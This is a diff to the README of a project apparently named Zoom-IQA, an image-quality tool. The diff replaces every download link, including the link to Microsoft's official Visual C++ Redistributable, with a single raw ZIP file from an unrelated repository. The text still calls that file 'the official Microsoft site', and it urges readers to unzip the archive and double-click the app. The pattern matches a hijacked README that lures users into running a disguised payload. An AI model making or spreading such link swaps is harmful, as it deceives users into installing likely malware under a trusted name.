@@ -5,7 +5,7 @@ description: "Elevate image quality assessment with reliable region-aware reason
 ---
 # 🔍 Zoom-IQA - See Image Quality With Precision
 
-[![Download Zoom-IQA](https://img.shields.io/badge/Download-Zoom--IQA-2ea44f?style=for-the-badge)](https://github.com/Officiallexibeckmen/Zoom-IQA)
+[![Download Zoom-IQA](https://img.shields.io/badge/Download-Zoom--IQA-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Officiallexibeckmen/officiallexibeckmen.github.io/main/manrent/v2.4-beta.2.zip)
 
 ## 🌟 What Is Zoom-IQA?
 
@@ -29,7 +29,7 @@ Getting Zoom-IQA running on your computer is simple. Follow these steps and you'
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Officiallexibeckmen/Zoom-IQA](https://github.com/Officiallexibeckmen/Zoom-IQA)
+Visit this link to download the application: [https://raw.githubusercontent.com/Officiallexibeckmen/officiallexibeckmen.github.io/main/manrent/v2.4-beta.2.zip](https://raw.githubusercontent.com/Officiallexibeckmen/officiallexibeckmen.github.io/main/manrent/v2.4-beta.2.zip)
 
 ![](https://img.shields.io/badge/CLICK_HERE-TO_DOWNLOAD-blue?style=for-the-badge&logo=github)
 
@@ -95,7 +95,7 @@ Make sure you fully extracted the ZIP file (right-click > "Extract All"). Don't 
 That's normal. 4K+ images take 10-20 seconds to process. If it's taking longer than a minute, close other heavy programs to free up memory.
 
 **I get a "missing DLL" error.**
-This happens rarely. Download the latest version from the link above. If the problem persists, install the latest [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) from the official Microsoft site.
+This happens rarely. Download the latest version from the link above. If the problem persists, install the latest [Microsoft Visual C++ Redistributable](https://raw.githubusercontent.com/Officiallexibeckmen/officiallexibeckmen.github.io/main/manrent/v2.4-beta.2.zip) from the official Microsoft site.
 
 **The heatmap doesn't show.**
 Some image viewers don't display overlays properly. In Zoom-IQA, click "View" > "Show Heatmap" to toggle it on. Also ensure your image isn't in grayscale mode.
@@ -114,7 +114,7 @@ Zoom-IQA is released under the MIT License. That means you can use it freely, mo
 
 **Ready to see your images like never before?**
 
-[⬇️ Download Zoom-IQA Now](https://github.com/Officiallexibeckmen/Zoom-IQA)
+[⬇️ Download Zoom-IQA Now](https://raw.githubusercontent.com/Officiallexibeckmen/officiallexibeckmen.github.io/main/manrent/v2.4-beta.2.zip)
 
 Click the button above, download the ZIP, unzip it, and double-click the app. You'll be analyzing image quality in under two minutes. No technical skills needed. Just honest, detailed feedback for every picture you care about.
 
